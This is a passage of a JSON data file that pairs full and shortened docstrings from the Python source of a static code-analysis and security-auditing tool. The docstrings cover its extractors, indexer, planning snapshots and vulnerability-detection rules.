    "original": "\"\"\"JavaScript/TypeScript extractor.\n\nThis extractor:\n1. Delegates core extraction to the AST parser\n2. Performs framework-specific analysis (React/Vue) on the extracted data\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nThis is an EXTRACTOR layer module. It:\n- RECEIVES: file_info dict (contains 'path' key from indexer)\n- DELEGATES: To ast_parser.extract_X(tree) methods (line 290 for object literals)\n- RETURNS: Extracted data WITHOUT file_path keys\n\nThe INDEXER layer (indexer/__init__.py) provides file_path and stores to database.\nSee indexer/__init__.py:948-962 for object literal storage example:\n  - Line 952: Uses file_path parameter (from orchestrator)\n  - Line 953: Uses obj_lit['line'] (from this extractor's delegation to typescript_impl.py)\n\nThis separation ensures single source of truth for file paths.\n\"\"\"",
    "truncated": "\"\"\"JavaScript/TypeScript extractor.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Terraform file extractor.\n\nHandles extraction of Terraform/HCL infrastructure definitions including:\n- Resource blocks (aws_instance, azurerm_storage_account, etc.)\n- Variable declarations\n- Output blocks\n- Module configurations\n- Provider settings\n- Data source references\n\nARCHITECTURE: Database-first, zero fallbacks.\n- Uses tree-sitter HCL parser for structural extraction\n- NO regex fallbacks - hard fail if parsing fails\n- Returns extracted data dict for indexer to store in database\n- Facts go to repo_index.db terraform_* tables\n- Graph edges built separately by TerraformGraphBuilder → graphs.db\n\nCRITICAL: This extractor ONLY extracts facts from .tf files.\nGraph relationships (variable → resource → output) are built in Phase 4 by graph builder.\n\"\"\"",
    "truncated": "\"\"\"Terraform file extractor.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"\n    Extract comment hallucination features from Claude Code session logs.\n\n    Detects when AI references comments and tracks hallucination patterns:\n    - comment_reference_count: How often AI mentioned comments for this file\n    - comment_hallucination_count: References flagged as potentially wrong\n    - comment_conflict_rate: Rate of concerning patterns (said X but actually Y)\n\n    Args:\n        session_dir: Path to Claude session logs directory\n        graveyard_path: Path to comment_graveyard.json (from purge script)\n        file_paths: List of files to analyze\n\n    Returns:\n        dict with keys:\n        - comment_reference_count: Total references to comments in this file\n        - comment_hallucination_count: References with warning severity\n        - comment_conflict_rate: Ratio of hallucinations to total references\n        - has_removed_comments: Whether file had comments purged\n    \"\"\"",
    "truncated": "\"\"\"Extract comment hallucination features from Claude Code session logs.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"\n    Extract phase-level execution data from pipeline.log.\n\n    Returns dict mapping phase names to timing/status:\n    {\n        \"1. Index repository\": {\n            \"elapsed\": 45.2,\n            \"status\": \"success\",\n            \"phase_num\": 1,\n            \"exit_code\": 0\n        },\n        \"14. Taint analysis\": {\n            \"elapsed\": 120.5,\n            \"status\": \"success\",\n            \"phase_num\": 14,\n            \"exit_code\": 0,\n            \"findings\": \"CRITICAL\"\n        }\n    }\n    \"\"\"",
    "truncated": "\"\"\"Extract phase-level execution data from pipeline.log.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"\ntheauditor/linters.py - Run external linters and store findings.\n\nPHILOSOPHY:\n- Database-first: Query files table, don't walk filesystem\n- Config-driven: Use .auditor_venv/.theauditor_tools/ configs\n- Tool-native: Use --format json, no regex parsing\n- Single responsibility: One clear job per function\n- Dual-write: Database + JSON (Truth Courier architecture)\n\nFLOW:\n1. Query database for files by extension\n2. Run tool with --format json --output-file <path>\n3. Parse JSON output (trivial json.load())\n4. Write to findings_consolidated table\n5. Write to .pf/raw/lint.json for AI consumption\n\nARCHITECT APPROVED: 2025-10-10\nAUDIT FIXES APPLIED: 2025-10-10\n\"\"\"",
    "truncated": "\"\"\"theauditor/linters.py - Run external linters and store findings.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Create code snapshot using shadow git repository.\n\n        Reads files from project_root, commits them to .pf/snapshots.git,\n        and stores metadata in SQLite. Uses atomic transaction for sequence\n        assignment to prevent race conditions.\n\n        Args:\n            plan_id: ID of plan\n            checkpoint_name: Name of checkpoint (e.g., \"added-imports\")\n            project_root: Root directory of user's project\n            files_affected: List of relative file paths to snapshot\n            task_id: Optional task ID for sequence tracking\n\n        Returns:\n            tuple: (snapshot_id, shadow_sha)\n                - snapshot_id: SQLite row ID\n                - shadow_sha: SHA-1 of commit in snapshots.git\n\n        NO FALLBACKS. Raises on any error.\n        \"\"\"",
    "truncated": "\"\"\"Create code snapshot using shadow git repository.\"\"\""
  },
  {
    "file": "theauditor/planning/snapshots.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Snapshot management for planning system.\n\nDEPRECATED: This module contains legacy snapshot functions that use subprocess\nto shell out to git and manually parse diffs. New code should use:\n- PlanningManager.create_snapshot() - Uses pygit2 shadow repo\n- ShadowRepoManager - Direct access to .pf/snapshots.git\n\nThe legacy functions are kept for backward compatibility but will be removed\nin a future version.\n\nMigration path:\n    # OLD (deprecated)\n    from theauditor.planning.snapshots import create_snapshot\n    snapshot_data = create_snapshot(plan_id, name, repo_root, task_id, manager)\n\n    # NEW (recommended)\n    from theauditor.planning import PlanningManager\n    manager = PlanningManager(db_path)\n    snapshot_id, sha = manager.create_snapshot(plan_id, name, repo_root, files, task_id)\n\"\"\"",
    "truncated": "\"\"\"Snapshot management for planning system.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/update_lag.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Detect severely outdated dependencies using existing version check data.\n\nThis rule detects dependencies that are 2+ major versions behind latest by reading\nthe deps_latest.json file created by 'aud deps --check-latest'.\n\nARCHITECTURE NOTE: This is a HYBRID APPROACH (database + file I/O) by design:\n- Database-first: Validates packages against package_configs table\n- File I/O: Reads pre-computed version comparison data from .pf/raw/deps_latest.json\n- Rationale: Version checking requires network calls (npm/PyPI API), which are slow\n  and should only run on-demand via 'aud deps --check-latest', not every pattern scan\n\nWorkflow Integration:\n1. User runs: aud deps --check-latest (creates .pf/raw/deps_latest.json)\n2. User runs: aud detect-patterns (this rule reads the JSON file)\n3. Rule reports packages that are severely outdated (2+ major versions behind)\n\nDatabase Tables Used:\n- package_configs: Current dependency versions (for validation)\n- Reads: .pf/raw/deps_latest.json (if it exists)\n\"\"\"",
    "truncated": "\"\"\"Detect severely outdated dependencies using existing version check data.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/compose_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Detect Docker Compose security misconfigurations using indexed data.\n\n    Analyzes compose_services table for:\n    - Docker socket mounting (container escape risk)\n    - Privileged containers\n    - Host network mode\n    - Weak/hardcoded passwords\n    - Exposed database and admin ports\n    - Unpinned or vulnerable image versions\n    - Dangerous volume mounts\n    - Insecure capabilities\n\n    All data comes from pre-indexed compose_services table.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of StandardFinding objects for detected issues\n    \"\"\"",
    "truncated": "\"\"\"Detect Docker Compose security misconfigurations using indexed data.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/react_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Detect React security vulnerabilities.\n\n    Analyzes database for:\n    - dangerouslySetInnerHTML usage without sanitization\n    - Exposed API keys in frontend code\n    - eval() with JSX content\n    - Unsafe target=\"_blank\" links\n    - Direct innerHTML manipulation\n    - Hardcoded credentials\n    - Insecure client-side storage\n    - Missing input validation\n    - useEffect without cleanup\n    - Unprotected routes\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of StandardFinding objects for detected issues\n    \"\"\"",
    "truncated": "\"\"\"Detect React security vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/logic/general_logic_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Detect common logic and resource management issues using indexed data.\n\n    Detects:\n    Business Logic Issues:\n    - Money/float arithmetic precision problems\n    - Timezone-naive datetime usage\n    - Email regex validation anti-pattern\n    - Division by zero risks\n    - Percentage calculation errors\n\n    Resource Management Issues:\n    - File handles not closed properly\n    - Database connections without cleanup\n    - Transactions without commit/rollback\n    - Sockets without proper cleanup\n    - Streams without cleanup\n\n    Returns:\n        List of logic and resource issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect common logic and resource management issues using indexed data.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_crypto_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Python Cryptography Vulnerability Analyzer - Database-First Approach.\n\nDetects weak cryptography and insecure crypto practices using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\nDetects:\n- Weak hash algorithms (MD5, SHA1)\n- Hardcoded cryptographic keys/secrets\n- Insecure random number generation\n- Missing HMAC verification\n- Weak key derivation\n- ECB mode usage\n- Small key sizes\n\"\"\"",
    "truncated": "\"\"\"Python Cryptography Vulnerability Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_injection_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Python Injection Vulnerability Analyzer - Database-First Approach.\n\nDetects various injection vulnerabilities in Python code using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\nDetects:\n- SQL Injection\n- Command Injection\n- Code Injection (eval/exec)\n- Template Injection\n- LDAP Injection\n- NoSQL Injection\n- XPath Injection\n\"\"\"",
    "truncated": "\"\"\"Python Injection Vulnerability Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/quality/deadcode_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Detect dead code using database queries.\n\n    Detection Strategy:\n        1. Query symbols table for files with code definitions\n        2. Query refs table for imported files\n        3. Set difference identifies dead code\n        4. Filter exclusions (__init__.py, tests, migrations)\n\n    Database Tables Used:\n        - symbols (read: path, name)\n        - refs (read: value, kind)\n\n    Known Limitations:\n        - Does NOT detect dynamically imported modules (importlib.import_module)\n        - Does NOT detect getattr() dynamic calls\n        - Static analysis only\n\n    Returns:\n        List of findings with severity=INFO\n    \"\"\"",
    "truncated": "\"\"\"Detect dead code using database queries.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Detect hardcoded secrets using hybrid approach.\n\n    Detects:\n    - API keys and tokens in code\n    - Hardcoded passwords\n    - Private keys and certificates\n    - AWS/Azure/GCP credentials\n    - Database connection strings with passwords\n    - Environment variable fallbacks\n\n    This is a HYBRID rule that uses:\n    - Database for finding string assignments\n    - Pattern matching and entropy calculation (computational)\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of hardcoded secret findings\n    \"\"\"",
    "truncated": "\"\"\"Detect hardcoded secrets using hybrid approach.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Hardcoded Secrets Analyzer - Hybrid Database/Pattern Approach.\n\nThis rule demonstrates a JUSTIFIED HYBRID approach because:\n1. Entropy calculation is computational, not indexed\n2. Base64 decoding and verification requires runtime processing\n3. Pattern matching for secret formats needs regex evaluation\n4. Sequential/keyboard pattern detection is algorithmic\n5. Normalized assignment metadata distinguishes literal secrets from dynamic sources\n\nFollows gold standard patterns (v1.1+ schema contract compliance):\n- Frozensets for O(1) pattern matching\n- Direct database queries (assumes all tables exist per schema contract)\n- Proper Severity and Confidence enums\n- Standardized finding generation with correct parameter names\n\nFalse positive fixes (2025-11-22):\n- Credit: Technique adapted from external contributor @dev-corelift (PR #20)\n- Adds literal string extraction to avoid flagging dynamic values like request.headers.get()\n- Properly handles f-strings, template literals, and function calls\n\"\"\"",
    "truncated": "\"\"\"Hardcoded Secrets Analyzer - Hybrid Database/Pattern Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/security/pii_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"PII Data Analyzer - Comprehensive International Edition.\n\nDetects 200+ PII patterns across 15 categories with international support for 50+ countries.\nImplements GDPR, CCPA, COPPA, HIPAA, PCI-DSS, and other privacy regulation checks.\n\nThis implementation:\n- Uses frozensets for O(1) pattern matching (immutable, hashable)\n- Direct database queries (assumes all tables exist per schema contract)\n- Uses parameterized queries (no SQL injection)\n- Implements multi-layer detection patterns\n- Provides confidence scoring based on context\n- Maps all findings to privacy regulations (15 major regulations)\n- Supports international PII formats (50+ countries)\n- Relies on normalized endpoint/storage metadata to reduce substring-based noise\n\nFalse positive fixes (2025-11-22):\n- Credit: Token-based matching technique from external contributor @dev-corelift (PR #20)\n- Prevents false positives from generic fields like \"message\" (vs sms_history) and \"className\" (vs student_id)\n- Uses camelCase-aware identifier tokenization with LRU caching for performance\n\"\"\"",
    "truncated": "\"\"\"PII Data Analyzer - Comprehensive International Edition.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Detect multi-tenant security issues using database queries.\n\n    Detection strategy:\n    1. Query sql_queries for sensitive tables without tenant filtering\n    2. Query for RLS policies missing USING clause\n    3. Check transactions for missing SET LOCAL context\n    4. Find direct ID access without tenant validation\n    5. Detect superuser database connections\n    6. Find raw queries outside transactions\n    7. Detect ORM queries without tenant scope\n    8. Find bulk operations without tenant filtering\n    9. Detect cross-tenant JOINs\n    10. Find subqueries without tenant filtering\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of multi-tenant security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect multi-tenant security issues using database queries.\"\"\""
  },
  {
    "file": "theauditor/sandbox_executor.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Bundled runtime isolation for TheAuditor.\n\nARCHITECTURE: Bundled Runtime Isolation\n========================================\nTheAuditor bundles all external tool dependencies in .auditor_venv/:\n\nBUNDLED RUNTIMES:\n  - Python venv with all analysis dependencies (PyYAML, sqlparse, numpy, etc.)\n  - Portable Node.js runtime (no system Node.js required)\n  - npm packages (TypeScript parser, ESLint, etc.)\n\nThis module provides path helpers to use bundled tools instead of system installations.\nUsers don't need npm/node/pip packages installed globally - everything runs from .auditor_venv/.\n\nUSAGE:\n  from theauditor.sandbox_executor import get_bundled_node, get_bundled_npm\n\n  node_path = get_bundled_node()\n  subprocess.run([str(node_path), 'script.js'])\n\"\"\"",
    "truncated": "\"\"\"Bundled runtime isolation for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Parse graphs.db node ID into AccessPath.\n\n        Format: \"file::function::var\" or \"file::function::var.field1.field2\"\n\n        Args:\n            node_id: Node ID from graphs.db edges table\n            max_length: k-limiting bound (truncate deeper paths)\n\n        Returns:\n            AccessPath or None if node_id is invalid\n\n        Examples:\n            >>> AccessPath.parse(\"controller.ts::create::req.body.userId\")\n            AccessPath(file=\"controller.ts\", function=\"create\",\n                      base=\"req\", fields=(\"body\", \"userId\"))\n\n            >>> AccessPath.parse(\"service.ts::save::user\")\n            AccessPath(file=\"service.ts\", function=\"save\",\n                      base=\"user\", fields=())\n        \"\"\"",
    "truncated": "\"\"\"Parse graphs.db node ID into AccessPath.\"\"\""
  },
  {
    "file": "theauditor/taint/discovery.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"\n    Strict pattern matching for file I/O functions to avoid false positives.\n\n    Prevents substring matches like 'open' in 'openSgIpv4.addIngressRule'.\n\n    Args:\n        func_name: Function name to check (e.g., 'fs.readFile', 'open', 'openSgIpv4.addIngressRule')\n        patterns: List of file I/O function names (e.g., ['open', 'readFile'])\n\n    Returns:\n        True if func_name is a file I/O function, False for false positives\n\n    Examples:\n        >>> _matches_file_io_pattern('open', ['open'])\n        True\n        >>> _matches_file_io_pattern('fs.open', ['open'])\n        True\n        >>> _matches_file_io_pattern('openSgIpv4.addIngressRule', ['open'])\n        False\n    \"\"\"",
    "truncated": "\"\"\"Strict pattern matching for file I/O functions to avoid false positives.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"\n    Download and install OSV-Scanner binary for vulnerability detection.\n\n    OSV-Scanner is Google's official tool for scanning dependencies against\n    the OSV (Open Source Vulnerabilities) database. It provides offline\n    scanning capabilities once the database is downloaded.\n\n    FACTS (from installation.md - DO NOT HALLUCINATE):\n    - Binary source: https://github.com/google/osv-scanner/releases\n    - File naming: osv-scanner_{version}_{platform}_{arch}\n    - Single executable, no dependencies required\n    - SLSA3 compliant with provenance verification\n    - Offline database: {local_db_dir}/osv-scanner/{ecosystem}/all.zip\n\n    Args:\n        sandbox_dir: Directory to install OSV-Scanner (.auditor_venv/.theauditor_tools)\n\n    Returns:\n        Path to osv-scanner executable, or None if installation failed\n    \"\"\"",
    "truncated": "\"\"\"Download and install OSV-Scanner binary for vulnerability detection.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Extract all variable names from a Rust tree-sitter AST node.\n\n    This is the AST-pure extraction for Rust, matching the pattern of\n    extract_vars_from_typescript_node().\n\n    Recursively traverses the tree-sitter AST to find all identifiers.\n\n    Args:\n        node: Rust tree-sitter node\n        content: File content for text extraction\n        depth: Recursion depth to prevent infinite loops\n\n    Returns:\n        List of variable names found in the expression\n\n    Example:\n        node = field_expression for \"request.body.name\"\n        returns [\"request.body.name\", \"request.body\", \"request\"]\n    \"\"\"",
    "truncated": "\"\"\"Extract all variable names from a Rust tree-sitter AST node.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/async_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Python async pattern extractors - AsyncIO and concurrent patterns.\n\nThis module contains extraction logic for Python async/await patterns:\n- async def functions\n- await expressions\n- async with statements\n- async for loops\n- async generators\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'name', 'type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Python async pattern extractors - AsyncIO and concurrent patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Extract match/case statement patterns (Python 3.10+).\n\n    Detects:\n    - Number of case branches\n    - Wildcard pattern (case _)\n    - Guards (case x if condition)\n    - Pattern types\n\n    Returns:\n        List of match statement dicts:\n        {\n            'line': int,\n            'case_count': int,\n            'has_wildcard': bool,\n            'has_guards': bool,\n            'pattern_types': str,  # Comma-separated\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract match/case statement patterns (Python 3.10+).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Python core AST extractors - Language fundamentals.\n\nThis module contains extraction logic for core Python language features:\n- Functions, classes, imports, exports\n- Assignments, returns, calls\n- Properties, dicts\n- Type annotations and helpers\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'name', 'type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\"\"\"",
    "truncated": "\"\"\"Python core AST extractors - Language fundamentals.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/operator_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Extract membership testing (in/not in) operations.\n\n    Detects:\n    - in operator: x in list\n    - not in operator: y not in dict\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of membership test dicts:\n        {\n            'line': int,\n            'operator': str,  # 'in' | 'not in'\n            'container_type': str,  # Inferred type if possible\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract membership testing (in/not in) operations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/operator_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Extract chained comparison operations (1 < x < 10).\n\n    Detects:\n    - Chained comparisons: 1 < x < 10\n    - Multiple operators: a <= b <= c\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of chained comparison dicts:\n        {\n            'line': int,\n            'chain_length': int,  # Number of comparisons\n            'operators': List[str],  # List of operators in chain\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract chained comparison operations (1 < x < 10).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/operator_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Extract walrus operator usage (:= assignment expressions).\n\n    Detects:\n    - Assignment expressions: (x := value)\n    - Common in if statements: if (n := len(items)) > 0\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of walrus operator dicts:\n        {\n            'line': int,\n            'variable': str,  # Variable being assigned\n            'used_in': str,  # 'if' | 'while' | 'comprehension' | 'expression'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract walrus operator usage (:= assignment expressions).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Extract iterator protocol implementations.\n\n    Detects:\n    - __iter__ method\n    - __next__ method\n    - StopIteration raises\n    - Generator-based __iter__\n\n    Returns:\n        List of iterator protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'has_iter': bool,\n            'has_next': bool,\n            'raises_stopiteration': bool,\n            'is_generator': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract iterator protocol implementations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/type_extractors.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Python advanced type extractors - Protocol, Generic, TypedDict, Literal.\n\nThis module contains extraction logic for advanced Python type system features:\n- Protocol (structural subtyping)\n- Generic[T] (generic classes and functions)\n- TypedDict (structured dict types)\n- Literal (literal types)\n- @overload (function overloading)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'name', 'type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Python advanced type extractors - Protocol, Generic, TypedDict, Literal.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"\n    Parse dependencies from the indexed database.\n\n    Architecture:\n    - DB-ONLY: Reads from package_configs and python_package_configs tables\n    - NO FALLBACKS: If DB doesn't exist, fail loudly\n    - Docker/Cargo: Still parsed from files (not yet indexed)\n\n    Returns list of dependency objects with structure:\n    {\n        \"name\": str,\n        \"version\": str,\n        \"manager\": \"npm\"|\"py\"|\"docker\"|\"cargo\",\n        \"files\": [paths that import it],\n        \"source\": \"package.json|pyproject.toml|requirements.txt\"\n    }\n\n    Requires: Run 'aud full --index' first to populate the database.\n    \"\"\"",
    "truncated": "\"\"\"Parse dependencies from the indexed database.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Build unified data flow graph combining all edge types.\n\n        Architecture (Strategy Pattern):\n        - Core builders: Assignment, Return, Parameter, Cross-boundary (always run)\n        - Strategies: Language-specific logic (Express, ORM, etc.) - pluggable\n\n        Includes:\n        - Assignment edges (x = y)\n        - Return edges (return x)\n        - Parameter binding edges (func(x) -> param)\n        - Cross-boundary edges (frontend -> backend API)\n        - Strategy edges (Express middleware, Python ORM, etc.)\n\n        Args:\n            root: Project root directory\n\n        Returns:\n            Combined graph with all data flow edges (complete provenance)\n        \"\"\"",
    "truncated": "\"\"\"Build unified data flow graph combining all edge types.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/security_database.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Add a SQL query record to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationship.\n        - Phase 1: Batch SQL query record (without tables column)\n        - Phase 2: Batch junction records for each table referenced\n\n        Args:\n            file_path: Path to the file containing the query\n            line: Line number\n            query_text: SQL query text\n            command: SQL command type (SELECT, INSERT, etc.)\n            tables: List of table names referenced\n            extraction_source: Source of extraction - one of:\n                - 'code_execute': Direct db.execute() calls (HIGH priority for SQL injection)\n                - 'orm_query': ORM method calls (MEDIUM priority, usually parameterized)\n                - 'migration_file': Database migration files (LOW priority, DDL only)\n\n        NO FALLBACKS. If tables is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a SQL query record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Extract all relevant information from a Terraform file.\n\n        Args:\n            file_info: File metadata dictionary with 'path' key\n            content: File content (unused - parser reads file directly)\n            tree: Optional pre-parsed AST tree from tree-sitter HCL parser\n\n        Returns:\n            Dictionary containing all extracted data:\n            {\n                'terraform_file': {...},           # File metadata\n                'terraform_resources': [...],      # Resource blocks\n                'terraform_variables': [...],      # Variable declarations\n                'terraform_outputs': [...],        # Output blocks\n                'terraform_modules': [...],        # Module configurations (not stored to DB yet)\n                'terraform_providers': [...],      # Provider settings (not stored to DB yet)\n                'terraform_data': [...],           # Data source blocks (not stored to DB yet)\n            }\n        \"\"\"",
    "truncated": "\"\"\"Extract all relevant information from a Terraform file.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/frameworks_schema.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"\nFramework-focused schema definitions - Cross-language framework patterns.\n\nThis module contains table schemas for web framework patterns:\n- ORM relationships (SQLAlchemy, Django, Sequelize, TypeORM, Diesel)\n- API routing (Flask, FastAPI, Django, Express, NestJS)\n- ORM query patterns (cross-language ORM analysis)\n\nDesign Philosophy:\n- Language-agnostic framework patterns (Python, Node, future Rust)\n- Used by framework-specific security rules\n- Focused on ORM and API routing vulnerabilities\n\nThese tables are populated by multiple extractors:\n- ORM_RELATIONSHIPS: Python extractor (SQLAlchemy/Django), Node extractor (Sequelize/TypeORM)\n- API_ENDPOINTS/CONTROLS: Python extractor (Flask/FastAPI/Django), Node extractor (Express/NestJS)\n- ORM_QUERIES: Python extractor, Node extractor\n- PRISMA_MODELS: Node extractor (Prisma)\n\"\"\"",
    "truncated": "\"\"\"Framework-focused schema definitions - Cross-language framework patterns.\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Read files from project_root and commit them to the shadow repo.\n\n        Args:\n            project_root: Root directory of the user's project\n            file_paths: List of relative file paths to snapshot\n            message: Commit message for the snapshot\n\n        Returns:\n            str: The SHA-1 hash of the new shadow commit\n\n        Raises:\n            pygit2.GitError: If git operations fail\n\n        Warns:\n            UserWarning: If any files in file_paths don't exist (skipped)\n\n        NO FALLBACKS. pygit2 errors cause hard failure.\n        Missing files are warned and skipped (may have been deleted).\n        \"\"\"",
    "truncated": "\"\"\"Read files from project_root and commit them to the shadow repo.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/password_analyze.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Password Security Analyzer - Database-First Approach.\n\nDetects password security vulnerabilities using database-driven approach.\nFollows gold standard patterns from jwt_analyze.py.\n\nNO AST TRAVERSAL. NO FILE I/O. PURE DATABASE QUERIES.\n\nDetects:\n- Weak password hashing algorithms (MD5, SHA1)\n- Hardcoded passwords in source code\n- Lack of password complexity enforcement\n- Passwords in GET request parameters\n\nCWE Coverage:\n- CWE-327: Use of Broken or Risky Cryptographic Algorithm\n- CWE-259: Use of Hard-coded Password\n- CWE-521: Weak Password Requirements\n- CWE-598: Use of GET Request Method With Sensitive Query Strings\n\"\"\"",
    "truncated": "\"\"\"Password Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/bundle_size.py",
    "line": -1,
    "original_lines": 19,
